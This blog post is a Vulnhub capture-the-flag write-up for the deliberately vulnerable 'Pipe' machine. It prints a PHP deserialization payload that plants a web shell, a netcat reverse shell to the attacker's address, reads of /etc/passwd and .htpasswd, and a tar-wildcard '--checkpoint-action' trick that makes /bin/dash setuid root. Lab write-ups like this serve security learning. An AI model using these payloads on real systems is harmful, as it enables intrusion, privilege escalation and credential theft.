---
layout:     post
title:      "Vulnhub.com - /dev/random Pipe"
subtitle:   "Write-Up"
date:       2017-07-31 8:00:00
author:     "W3ndige"
header-img: "img/pipe-header.jpeg"
permalink: /:title/
category: Vulnhub
---

<h1>Introduction</h1>
<p>Hello everyone, let's work on another machine from <a href="https://www.vulnhub.com/"><b>Vulnhub</b></a> called Pipe. Let's see how difficult it is! </p>

<p>Author: <a href="https://www.vulnhub.com/author/sagi-,36/"><b>Sagi</b></a></p>
<p>Download: <a href="https://www.vulnhub.com/entry/devrandom-pipe,124/"><b>/dev/random/ Pipe</b></a></p>

<h1>Write-Up</h1>

<p></p>
<p>Attacker: <b>Kali Linux 192.168.56.102</b></p>

<p>As always we have to start from finding out the IP address of the vulnerable machine, with essential info about services running on it.  </p>

{% highlight bash %}
root@kali:~# nmap 192.168.56.1/24

Starting Nmap 7.01 ( https://nmap.org ) at 2017-07-29 16:13 EDT
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 192.168.56.1
Host is up (0.00015s latency).
All 1000 scanned ports on 192.168.56.1 are closed
MAC Address: 0A:00:27:00:00:00 (Unknown)

Nmap scan report for 192.168.56.100
Host is up (0.000067s latency).
All 1000 scanned ports on 192.168.56.100 are filtered
MAC Address: 08:00:27:1D:FF:E0 (Oracle VirtualBox virtual NIC)

Nmap scan report for 192.168.56.101
Host is up (0.000076s latency).
All 1000 scanned ports on 192.168.56.101 are closed
MAC Address: 0A:00:27:00:00:00 (Unknown)

Nmap scan report for 192.168.56.103
Host is up (0.00014s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
111/tcp open  rpcbind
MAC Address: 08:00:27:39:B5:70 (Oracle VirtualBox virtual NIC)

Nmap scan report for 192.168.56.102
Host is up (0.000024s latency).
All 1000 scanned ports on 192.168.56.102 are closed

Nmap done: 256 IP addresses (5 hosts up) scanned in 5.83 seconds
{% endhighlight %}

<p>Basic info done, let's take a look at it. </p>
<p>Victim: <b>192.168.56.103</b></p>
<p>Open ports: <b>22 SSH</b>, <b>80 HTTP</b> and <b>111 RPCBIND</b>. </p>
<p>We can start from the bottom, maybe SSH will print us some clues, which are essential for further exploitation. </p>

{% highlight bash %}
root@kali:~# ssh 192.168.56.103
The authenticity of host '192.168.56.103 (192.168.56.103)' can't be established.
ECDSA key fingerprint is SHA256:6CI3N5VMaSG6TNWPt/7nhor3Dd4ug8YJel9Ycv/Ytwc.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.56.103' (ECDSA) to the list of known hosts.
root@192.168.56.103's password:
Permission denied, please try again.
{% endhighlight %}

<p>Unfortunately nothing here, no banners, no users, nothing. Maybe website wil be more useful?  Let's take a look at it. </p>

![Access](/img/pipe/access.png){:class="img-responsive center-block"}

<p>It looks as if <b>index.php</b> file is password protected. Every popular credentials I entered showed <b>Unauthorized</b> message, so we have to look further. </p>

{% highlight text %}
Unauthorized

This server could not verify that you are authorized to access the document requested. Either you supplied the wrong credentials (e.g., bad password), or your browser doesn't understand how to supply the credentials required.
{% endhighlight %}

<p>My next step is to run <b>nikto</b> and <b>dirbuster</b> scans to check for any hidden directories and possible vulnerabilities. </p>

{% highlight bash %}
root@kali:~# nikto -h 192.168.56.103
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.56.103
+ Target Hostname:    192.168.56.103
+ Target Port:        80
+ Start Time:         2017-07-29 16:21:32 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ / - Requires Authentication for realm 'index.php'
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ / - Requires Authentication for realm 'index.php'
+ / - Requires Authentication for realm 'index.php'
+ IP address found in the 'location' header. The IP is "127.0.1.1".
+ OSVDB-630: IIS may reveal its internal or real IP in the Location header via a request to the /images directory. The value is "http://127.0.1.1/images/".
+ / - Requires Authentication for realm 'index.php'
...
+ / - Requires Authentication for realm 'index.php'
+ OSVDB-3268: /images/: Directory indexing found.
+ / - Requires Authentication for realm 'index.php'
+ OSVDB-3268: /images/?pattern=/etc/*&sort=name: Directory indexing found.
+ / - Requires Authentication for realm 'index.php'
+ 7685 requests: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2017-07-29 16:21:57 (GMT-4) (25 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
{% endhighlight %}

<p>Great, images directory. This path <b>/images/pipe.jpg</b> presents an image of a pipe. </p>

![Pipe image](/img/pipe/pipe.png){:class="img-responsive center-block"}

<p>Unfortunately, checking it for hidden messages wasn't so succesful, so I decided to look at dirbuster scan. </p>

![Dirbuster](/img/pipe/dirbuster.png){:class="img-responsive center-block"}

<p>Another directory, and this one was missed by nikto. As these files may be very useful, let's take a look at them. </p>
<p><b>log.php.BAK</b></p>

{% highlight php %}
<?php
class Log
{
    public $filename = '';
    public $data = '';

    public function __construct()
    {
        $this->filename = '';
	      $this->data = '';
    }

    public function PrintLog()
    {
        $pre = "[LOG]";
	      $now = date('Y-m-d H:i:s');

        $str = '$pre - $now - $this->data';
        eval("\$str = \"$str\";");
        echo $str;
    }

    public function __destruct()
    {
	     file_put_contents($this->filename, $this->data, FILE_APPEND);
    }
}
?>
{% endhighlight %}

<p><b>php.js</b></p>

{% highlight js %}

function serialize(mixed_value) {
  //  discuss at: http://phpjs.org/functions/serialize/
  // original by: Arpad Ray (mailto:arpad@php.net)
  // improved by: Dino
  // improved by: Le Torbi (http://www.letorbi.de/)
  // improved by: Kevin van Zonneveld (http://kevin.vanzonneveld.net/)
  // bugfixed by: Andrej Pavlovic
  // bugfixed by: Garagoth
  // bugfixed by: Russell Walker (http://www.nbill.co.uk/)
  // bugfixed by: Jamie Beck (http://www.terabit.ca/)
  // bugfixed by: Kevin van Zonneveld (http://kevin.vanzonneveld.net/)
  // bugfixed by: Ben (http://benblume.co.uk/)
  //    input by: DtTvB (http://dt.in.th/2008-09-16.string-length-in-bytes.html)
  //    input by: Martin (http://www.erlenwiese.de/)
  //        note: We feel the main purpose of this function should be to ease the transport of data between php & js
  //        note: Aiming for PHP-compatibility, we have to translate objects to arrays
  //   example 1: serialize(['Kevin', 'van', 'Zonneveld']);
  //   returns 1: 'a:3:{i:0;s:5:"Kevin";i:1;s:3:"van";i:2;s:9:"Zonneveld";}'
  //   example 2: serialize({firstName: 'Kevin', midName: 'van', surName: 'Zonneveld'});
  //   returns 2: 'a:3:{s:9:"firstName";s:5:"Kevin";s:7:"midName";s:3:"van";s:7:"surName";s:9:"Zonneveld";}'

  var val, key, okey,
    ktype = '',
    vals = '',
    count = 0,
    _utf8Size = function(str) {
      var size = 0,
        i = 0,
        l = str.length,
        code = '';
      for (i = 0; i < l; i++) {
        code = str.charCodeAt(i);
        if (code < 0x0080) {
          size += 1;
        } else if (code < 0x0800) {
          size += 2;
        } else {
          size += 3;
        }
      }
      return size;
    },
    _getType = function(inp) {
      var match, key, cons, types, type = typeof inp;

      if (type === 'object' && !inp) {
        return 'null';
      }

      if (type === 'object') {
        if (!inp.constructor) {
          return 'object';
        }
        cons = inp.constructor.toString();
        match = cons.match(/(\w+)\(/);
        if (match) {
          cons = match[1].toLowerCase();
        }
        types = ['boolean', 'number', 'string', 'array'];
        for (key in types) {
          if (cons == types[key]) {
            type = types[key];
            break;
          }
        }
      }
      return type;
    },
    type = _getType(mixed_value);

  switch (type) {
  case 'function':
    val = '';
    break;
  case 'boolean':
    val = 'b:' + (mixed_value ? '1' : '0');
    break;
  case 'number':
    val = (Math.round(mixed_value) == mixed_value ? 'i' : 'd') + ':' + mixed_value;
    break;
  case 'string':
    val = 's:' + _utf8Size(mixed_value) + ':"' + mixed_value + '"';
    break;
  case 'array':
  case 'object':
    val = 'a';
    /*
        if (type === 'object') {
          var objname = mixed_value.constructor.toString().match(/(\w+)\(\)/);
          if (objname == undefined) {
            return;
          }
          objname[1] = this.serialize(objname[1]);
          val = 'O' + objname[1].substring(1, objname[1].length - 1);
        }
        */

    for (key in mixed_value) {
      if (mixed_value.hasOwnProperty(key)) {
        ktype = _getType(mixed_value[key]);
        if (ktype === 'function') {
          continue;
        }

        okey = (key.match(/^[0-9]+$/) ? parseInt(key, 10) : key);
        vals += this.serialize(okey) + this.serialize(mixed_value[key]);
        count++;
      }
    }
    val += ':' + count + ':{' + vals + '}';
    break;
  case 'undefined':
    // Fall-through
  default:
    // if the JS object has a property which contains a null value, the string cannot be unserialized by PHP
    val = 'N';
    break;
  }
  if (type !== 'object' && type !== 'array') {
    val += ';';
  }
  return val;
}

{% endhighlight %}

<p>But after some time I decided to fire up <b>Burp</b> in order to find anything more as these scripts meant nothing to me.  </p>

<p>And finally here it is, changing <b>GET</b> to <b>POST</b> resulted in access to the content. We can finally look at this website. </p>

{% highlight html %}
POST /index.php HTTP/1.1
Host: 192.168.56.103
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0 Iceweasel/43.0.4
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
{% endhighlight%}

{% highlight html %}
HTTP/1.1 200 OK
Date: Sat, 29 Jul 2017 21:05:19 GMT
Server: Apache
Vary: Accept-Encoding
X-Frame-Options: sameorigin
Content-Length: 2042
Connection: close
Content-Type: text/html; charset=UTF-8


<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<script src="scriptz/php.js"></script>
<script>
function submit_form() {
var object = serialize({id: 1, firstname: 'Rene', surname: 'Margitte', artwork: 'The Treachery of Images'});
object = object.substr(object.indexOf("{"),object.length);
object = "O:4:\"Info\":4:" + object;
document.forms[0].param.value = object;
document.getElementById('info_form').submit();
}
</script>
<title>The Treachery of Images</title>
</head>
<h1><i>The Treachery of Images</i></h1>
<hr />
From Wikipedia, the free encyclopedia
<br />
<br />
The Treachery of Images (French: La trahison des images, 1928â29, sometimes translated as The Treason of Images) is a painting by the Belgian surrealist painter RenÃ© Magritte, painted when Magritte was 30 years old. The picture shows a pipe. Below it, Magritte painted, "Ceci n'est pas une pipe." [sÉ.si ne pazâ¿yn pip], French for "This is not a pipe."
<p>
"The famous pipe. How people reproached me for it! And yet, could you stuff my pipe? No, it's just a representation, is it not? So if I had written on my picture 'This is a pipe', I'd have been lying!"
</p>
His statement is taken to mean that the painting itself is not a pipe. The painting is merely an image of a pipe. Hence, the description, "this is not a pipe." The theme of pipes with the text "Ceci n'est pas une pipe" is extended in his 1966 painting, Les Deux MystÃ¨res. It is currently on display at the Los Angeles County Museum of Art.
The painting is sometimes given as an example of meta message conveyed by paralanguage. Compare with Korzybski's "The word is not the thing" and "The map is not the territory".
<br />
<br />
<center><div style="width:500px;overflow:hidden;" >
   <img src="images/pipe.jpg" width="400px" height="auto" border="1">
</div>
<form action="index.php" id="info_form" method="POST">
   <input type="hidden" name="param" value="" />
   <a href="#" onclick="submit_form(); return false;">Show Artist Info.</a>
</form></center></html>
{% endhighlight %}

<p>But browser view will be much better. </p>

![Content](/img/pipe/access_granted.png){:class="img-responsive center-block"}

<p>Here we can see that there's the link, but clicking on it seemed to be broken, nothing was happening. After looking at Burp, I saw that it sends a parameter to the website. </p>

{% highlight html %}
POST /index.php HTTP/1.1
Host: 192.168.56.103
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0 Iceweasel/43.0.4
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.56.103/index.php
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 225

param=O%3A4%3A%22Info%22%3A4%3A%7Bs%3A2%3A%22id%22%3Bi%3A1%3Bs%3A9%3A%22firstname%22%3Bs%3A4%3A%22Rene%22%3Bs%3A7%3A%22surname%22%3Bs%3A8%3A%22Margitte%22%3Bs%3A7%3A%22artwork%22%3Bs%3A23%3A%22The+Treachery+of+Images%22%3B%7D
{% endhighlight %}

<p>And after decoding it we get a serialized message! That's where this scripts were used. </p>

![Encoder](/img/pipe/burp_encoder.png){:class="img-responsive center-block"}

<p>Let's take a closer look at it. </p>

{% highlight text%}
O:4:"Info":4:{s:2:"id";i:1;s:9:"firstname";s:4:"Rene";s:7:"surname";s:8:"Margitte";s:7:"artwork";s:23:"The+Treachery+of+Images";}
{% endhighlight %}

<p>Luckily, after a long read of the scripts, their logic and how they work, I managed to write a simple serialized object that will take GET parameters as commands, and execute them. </p>

{% highlight text %}
O:3:"Log":2:{s:8:"filename";s:30:"/var/www/html/scriptz/shell.php";s:4:"data";s:12:"<?php echo system($_GET['cmd']); ?>";}
{% endhighlight %}

<p>Now it's time to encode it as URL and paste into the repeater. </p>

![Repeater](/img/pipe/burp_repeater.png){:class="img-responsive center-block"}

<p>It works, refreshing the <b>scriptz</b> directory showed that a new file appeared! Let's test it. </p>

{% highlight text %}
http://192.168.56.103/scriptz/shell.php?cmd=whoami
www-data

http://192.168.56.103/scriptz/shell.php?cmd=uname%20-a
Linux pipe 3.16.0-4-amd64 #1 SMP Debian 3.16.7-ckt11-1 (2015-05-24) x86_64 GNU/Linux
{% endhighlight %}

<p>Great, it's now possible to inject commands. After looking for ways to reverse the shell, I found that <b>netcat</b> was installed, which will make it much easier. </p>

{% highlight text %}
http://192.168.56.103/scriptz/shell.php?cmd=nc%20-e%20/bin/sh%20192.168.56.102%201234

root@kali:~# nc -nvlp 1234
listening on [any] 1234 ...
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.103] 49960
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
{% endhighlight %}

<p>And we have the shell. We can use this Python trick to spawn <b>bash</b> shell. </p>

{% highlight bash %}
python -c 'import pty;pty.spawn("/bin/bash")'
www-data@pipe:/var/www/html/scriptz$
{% endhighlight %}

<p>Everything is working so far. But, what was the password during the authentication?  </p>

{% highlight bash %}
www-data@pipe:/var/www/html/scriptz$ cd ../
cd ../
www-data@pipe:/var/www/html$ ls -la
ls -la
total 36
drwxr-xr-x 4 www-data www-data 4096 Jul  9  2015 .
drwxr-xr-x 3 root     root     4096 Jul  5  2015 ..
-rw-r--r-- 1 www-data www-data  137 Jul  6  2015 .htaccess
-rw-r--r-- 1 www-data www-data   43 Jul  6  2015 .htpasswd
drwxr-xr-x 2 www-data www-data 4096 Jul  6  2015 images
-rw-r--r-- 1 www-data www-data 2801 Jul  9  2015 index.php
-rw-r--r-- 1 www-data www-data  150 Jul  6  2015 info.php
-rw-r--r-- 1 www-data www-data  474 Jul  6  2015 log.php
drwxr-xr-x 2 www-data www-data 4096 Jul 30 06:00 scriptz
www-data@pipe:/var/www/html$ cat .htpasswd
cat .htpasswd
rene:$apr1$wfYjXf4U$0ZZ.qhGGrtkOxvKr5WFqX/
{% endhighlight %}

<p>As it wasn't essential, I decided to find it as tthey may sometimes hold valuable information. But after looking at <b>/etc/passwd</b> I noticed account using the same name <b>rene</b>. Let's check <strike>her</strike>  <a href="https://en.wikipedia.org/wiki/Ren%C3%A9">his</a> home directory. </p>

{% highlight text %}
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
Debian-exim:x:104:109::/var/spool/exim4:/bin/false
messagebus:x:105:110::/var/run/dbus:/bin/false
statd:x:106:65534::/var/lib/nfs:/bin/false
avahi-autoipd:x:107:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin
rene:x:1000:1000:Rene Magritte,,,:/home/rene:/bin/bash
{% endhighlight %}

{% highlight bash %}
www-data@pipe:/var/www/html$ cd /home/rene
cd /home/rene
www-data@pipe:/home/rene$ ls -la
ls -la
total 24
drwxr-xr-x 3 rene rene 4096 Jul  6  2015 .
drwxr-xr-x 3 root root 4096 Jul  5  2015 ..
-rw-r--r-- 1 rene rene  220 Jul  5  2015 .bash_logout
-rw-r--r-- 1 rene rene 3515 Jul  5  2015 .bashrc
-rw-r--r-- 1 rene rene  675 Jul  5  2015 .profile
drwxrwxrwx 2 rene rene 4096 Jul 30 06:21 backup
www-data@pipe:/home/rene$ cd  backup
cd  backup
www-data@pipe:/home/rene/backup$ ls -la
ls -la
total 72
drwxrwxrwx 2 rene rene  4096 Jul 30 06:21 .
drwxr-xr-x 3 rene rene  4096 Jul  6  2015 ..
-rw-r--r-- 1 rene rene 50123 Jul 30 06:20 backup.tar.gz
-rw-r--r-- 1 rene rene 10605 Jul 30 06:21 sys-2875.BAK
{% endhighlight %}

<p>It's an automated backup! </p>

{% highlight bash %}
www-data@pipe:/home/rene/backup$ ls -la
ls -la
total 84
drwxrwxrwx 2 rene rene  4096 Jul 30 06:22 .
drwxr-xr-x 3 rene rene  4096 Jul  6  2015 ..
-rw-r--r-- 1 rene rene 50123 Jul 30 06:20 backup.tar.gz
-rw-r--r-- 1 rene rene 11529 Jul 30 06:22 sys-1884.BAK
-rw-r--r-- 1 rene rene 10605 Jul 30 06:21 sys-2875.BAK
{% endhighlight %}

<p>Let's look at the crontab. </p>

{% highlight bash %}
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root /root/create_backup.sh
*/5 * * * * root /usr/bin/compress.sh
{% endhighlight %}

<p>It is also possible to read <b>compress.sh</b> script. </p>

{% highlight bash %}
www-data@pipe:/home/rene/backup$ cat /usr/bin/compress.sh        
 cat /usr/bin/compress.sh
#!/bin/sh

rm -f /home/rene/backup/backup.tar.gz
cd /home/rene/backup
tar cfz /home/rene/backup/backup.tar.gz *
chown rene:rene /home/rene/backup/backup.tar.gz
rm -f /home/rene/backup/*.BAK
{% endhighlight %}

<p>A wildcard. After reading about <a href="http://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt"><b>Unix wildcard exploit</b></a>, it may be possible to gain root access. But firstly, what kind of shells are installed on the server? </p>

{% highlight bash %}
www-data@pipe:/home/rene/backup$ ls -la /bin/*sh
ls -al /bin/*sh
-rwxr-xr-x 1 root root 1029624 Jul 13  2014 /bin/bash
-rwxr-xr-x 1 root root  125400 Jul  8  2014 /bin/dash
lrwxrwxrwx 1 root root       4 Jul 13  2014 /bin/rbash -> bash
lrwxrwxrwx 1 root root       4 Jul  8  2014 /bin/sh -> dash
{% endhighlight %}

<p>Great, there is <b>/bin/dash</b> installed on the server. Now it's time to create a script that will allow us to root the box. </p>

{% highlight bash  %}
www-data@pipe:/home/rene/backup$ echo > --checkpoint=1;
echo > --checkpoint=1;
www-data@pipe:/home/rene/backup$ echo > --checkpoint-action=exec=sh\ shell.sh;
<ckup$ echo > --checkpoint-action=exec=sh\ shell.sh;                         
www-data@pipe:/home/rene/backup$ echo 'chmod u+s /bin/dash' > shell.sh
echo 'chmod u+s /bin/dash' > shell.sh
www-data@pipe:/home/rene/backup$ echo 'touch /home/rene/backup/done' >> shell.sh
<ckup$ echo 'touch /home/rene/backup/done' >> shell.sh                       
www-data@pipe:/home/rene/backup$ cat shell.sh
cat shell.sh
chmod u+s /bin/dash
touch /home/rene/backup/done
www-data@pipe:/home/rene/backup$ chmod +x shell.sh
chmod +x shell.sh
{% endhighlight %}

<p>And now we only have to wait for a file called <b>done</b>. After few minutes it appeared. </p>

{% highlight bash %}
www-data@pipe:/home/rene/backup$ ls -la
ls -la
total 124
-rw-r--r-- 1 www-data www-data      1 Jul 30 07:05 --checkpoint-action=exec=sh shell.sh
-rw-r--r-- 1 www-data www-data      1 Jul 30 07:05 --checkpoint=1
drwxrwxrwx 2 rene     rene       4096 Jul 30 07:10 .
drwxr-xr-x 3 rene     rene       4096 Jul  6  2015 ..
-rw-r--r-- 1 rene     rene     104106 Jul 30 07:10 backup.tar.gz
-rw-r--r-- 1 root     root          0 Jul 30 07:10 done
-rwxr-xr-x 1 www-data www-data     49 Jul 30 07:05 shell.sh
{% endhighlight %}

<p>By launching <b>dash</b> shell, we are privilaged with root access.  </p>

{% highlight bash%}
www-data@pipe:/home/rene/backup$ /bin/dash
/bin/dash
# id
id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
# whoami
whoami
root
{% endhighlight %}

<p>Let's look for final flag. </p>

{% highlight bash %}
# ls -la /root
ls -la /root
total 28
drwx------  2 root root 4096 Jul  9  2015 .
drwxr-xr-x 22 root root 4096 Jul  5  2015 ..
lrwxrwxrwx  1 root root    9 Jul  5  2015 .bash_history -> /dev/null
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
lrwxrwxrwx  1 root root    9 Jul  9  2015 .nano_history -> /dev/null
-rw-r--r--  1 root root  140 Nov 20  2007 .profile
-rwx------  1 root root  120 Jul  6  2015 create_backup.sh
-rw-------  1 root root 4251 Jul  6  2015 flag.txt
# cat /root/flag.txt
cat /root/flag.txt
                                                                   .aMMMMMMMMn.  ,aMMMMn.
                                                                 .aMccccccccc*YMMn.    `Mb
                                                                aMccccccccccccccc*Mn    MP
                                                               .AMMMMn.   MM `*YMMY*ccaM*
                                                              dM*  *YMMb  YP        `cMY
                                                              YM.  .dMMP   aMn.     .cMP
                                                               *YMMn.     aMMMMMMMMMMMY'
                                                                .'YMMb.           ccMP
                                                             .dMcccccc*Mc....cMb.cMP'
                                                           .dMMMMb;cccc*Mbcccc,IMMMMMMMn.
                                                          dY*'  '*M;ccccMM..dMMM..MP*cc*Mb
                                                          YM.    ,MbccMMMMMMMMMMMM*cccc;MP
                                                           *Mbn;adMMMMMMMMMMMMMMMIcccc;M*
                                                          dPcccccIMMMMMMMMMMMMMMMMa;c;MP
                                                          Yb;cc;dMMMMMMMMMMMP*'  *YMMP*
                                                           *YMMMPYMMMMMMP*'          curchack
                                                       +####################################+
                                                       |======                            | |
                                                       |======                            | |
                                                       |======                            | |
                                                       |======                            | |
                                                       |======                            | |
                                                       +----------------------------------+-+
                                                        ####################################
                                                             |======                  |
                                                             |======                  |
                                                             |=====                   |
                                                             |====                    |
                                                             |                        |
                                                             +                        +

 .d8888b.                 d8b          d8b               888                                                                    d8b
d88P  Y88b                Y8P          88P               888                                                                    Y8P
888    888                             8P                888
888        .d88b.  .d8888b888   88888b."  .d88b. .d8888b 888888   88888b.  8888b. .d8888b    888  88888888b.  .d88b.    88888b. 88888888b.  .d88b.
888       d8P  Y8bd88P"   888   888 "88b d8P  Y8b88K     888      888 "88b    "88b88K        888  888888 "88bd8P  Y8b   888 "88b888888 "88bd8P  Y8b
888    88888888888888     888   888  888 88888888"Y8888b.888      888  888.d888888"Y8888b.   888  888888  88888888888   888  888888888  88888888888
Y88b  d88PY8b.    Y88b.   888   888  888 Y8b.         X88Y88b.    888 d88P888  888     X88   Y88b 888888  888Y8b.       888 d88P888888 d88PY8b.   d8b
 "Y8888P"  "Y8888  "Y8888P888   888  888  "Y8888  88888P' "Y888   88888P" "Y888888 88888P'    "Y88888888  888 "Y8888    88888P" 88888888P"  "Y8888Y8P
                                                                  888                                                   888        888
                                                                  888                                                   888        888
                                                                  888                                                   888        888
Well Done!
Here's your flag: 0089cd4f9ae79402cdd4e7b8931892b7
{% endhighlight %}

<p>And here it is! </p>
